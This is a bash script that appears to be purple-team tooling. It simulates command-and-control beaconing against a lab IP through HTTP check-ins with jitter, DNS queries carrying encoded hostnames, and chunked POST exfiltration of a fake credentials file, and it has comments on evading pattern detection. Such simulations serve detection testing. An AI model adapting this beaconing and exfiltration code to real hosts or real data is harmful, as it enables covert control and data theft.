#!/bin/bash
###############################################################################
# C2 Beaconing Simulation
# Simulates command-and-control communication patterns
###############################################################################

TARGET_IP="${1:-10.10.40.10}"
TARGET_PORT="${2:-80}"
RESULTS_DIR="${3:-.}"

echo "=============================================="
echo "C2 Beaconing Simulation"
echo "Target: ${TARGET_IP}:${TARGET_PORT}"
echo "=============================================="
echo ""

echo "Select C2 pattern:"
echo "1) Regular HTTP beacon (every 30s, 10 iterations)"
echo "2) Jittered HTTP beacon (20-40s random, 10 iterations)"
echo "3) DNS beacon simulation"
echo "4) HTTP exfiltration simulation"
echo "5) Long-running beacon (every 60s, 30 iterations)"
echo ""
read -p "Choice [1-5]: " choice

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="${RESULTS_DIR}/c2_beacon_${TIMESTAMP}.log"

echo "Starting C2 simulation at $(date)" | tee "${LOG_FILE}"

case "$choice" in
    1)
        echo "Running regular HTTP beacon (30s interval, 10 iterations)..."
        for i in {1..10}; do
            BEACON_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
            
            # Simulate beacon with specific User-Agent (C2 often has distinctive UAs)
            RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
                -A "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)" \
                -H "X-Request-ID: $(uuidgen)" \
                "http://${TARGET_IP}:${TARGET_PORT}/" 2>/dev/null)
            
            echo "[${BEACON_TIME}] Beacon ${i}/10 - Response: ${RESPONSE}" | tee -a "${LOG_FILE}"
            
            if [[ $i -lt 10 ]]; then
                sleep 30
            fi
        done
        ;;
    2)
        echo "Running jittered HTTP beacon (20-40s random, 10 iterations)..."
        for i in {1..10}; do
            BEACON_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
            
            # Random data in POST body (simulates C2 check-in)
            RANDOM_DATA=$(head -c 64 /dev/urandom | base64 | tr -d '\n')
            
            RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
                -X POST \
                -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d "data=${RANDOM_DATA}" \
                "http://${TARGET_IP}:${TARGET_PORT}/" 2>/dev/null)
            
            echo "[${BEACON_TIME}] Beacon ${i}/10 - Response: ${RESPONSE}" | tee -a "${LOG_FILE}"
            
            if [[ $i -lt 10 ]]; then
                # Random sleep between 20-40 seconds
                JITTER=$((RANDOM % 21 + 20))
                echo "  Sleeping ${JITTER}s (jittered)..." | tee -a "${LOG_FILE}"
                sleep ${JITTER}
            fi
        done
        ;;
    3)
        echo "Running DNS beacon simulation (using dig)..."
        # Simulate DNS-based C2 with encoded subdomains
        for i in {1..10}; do
            BEACON_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
            
            # Generate "encoded" subdomain (simulates data exfil via DNS)
            ENCODED=$(echo "beacon-${i}-$(hostname)" | base64 | tr -d '=' | tr '/+' '_-' | cut -c1-20)
            
            # Query a DNS server (this creates DNS traffic pattern)
            dig +short "${ENCODED}.${TARGET_IP}.nip.io" @8.8.8.8 > /dev/null 2>&1
            
            echo "[${BEACON_TIME}] DNS Beacon ${i}/10 - Query: ${ENCODED}..." | tee -a "${LOG_FILE}"
            
            if [[ $i -lt 10 ]]; then
                sleep 15
            fi
        done
        ;;
    4)
        echo "Running HTTP exfiltration simulation..."
        # Create fake sensitive data
        FAKE_DATA_FILE="${RESULTS_DIR}/fake_exfil_data.txt"
        cat > "${FAKE_DATA_FILE}" << 'EOF'
username,password,email
admin,P@ssw0rd123,admin@example.com
jsmith,Summer2024!,john.smith@example.com
ajonson,Welcome123,alice.johnson@example.com
EOF
        
        for i in {1..5}; do
            BEACON_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
            
            # Simulate chunked data exfiltration
            CHUNK=$(sed -n "${i}p" "${FAKE_DATA_FILE}" | base64)
            
            RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
                -X POST \
                -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
                -H "Content-Type: application/octet-stream" \
                -H "X-Chunk-ID: ${i}" \
                -d "${CHUNK}" \
                "http://${TARGET_IP}:${TARGET_PORT}/upload" 2>/dev/null)
            
            echo "[${BEACON_TIME}] Exfil chunk ${i}/5 - Response: ${RESPONSE}" | tee -a "${LOG_FILE}"
            
            # Variable delay to avoid pattern detection
            DELAY=$((RANDOM % 10 + 5))
            sleep ${DELAY}
        done
        ;;
    5)
        echo "Running long beacon (60s interval, 30 iterations)..."
        echo "This will take approximately 30 minutes..."
        for i in {1..30}; do
            BEACON_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
            
            # Simple GET beacon
            RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
                -A "Mozilla/5.0 (compatible; Googlebot/2.1)" \
                "http://${TARGET_IP}:${TARGET_PORT}/robots.txt" 2>/dev/null)
            
            echo "[${BEACON_TIME}] Beacon ${i}/30 - Response: ${RESPONSE}" | tee -a "${LOG_FILE}"
            
            if [[ $i -lt 30 ]]; then
                sleep 60
            fi
        done
        ;;
    *)
        echo "Invalid choice"
        exit 1
        ;;
esac

echo ""
echo "C2 simulation complete at $(date)" | tee -a "${LOG_FILE}"
echo "Results saved to ${LOG_FILE}"
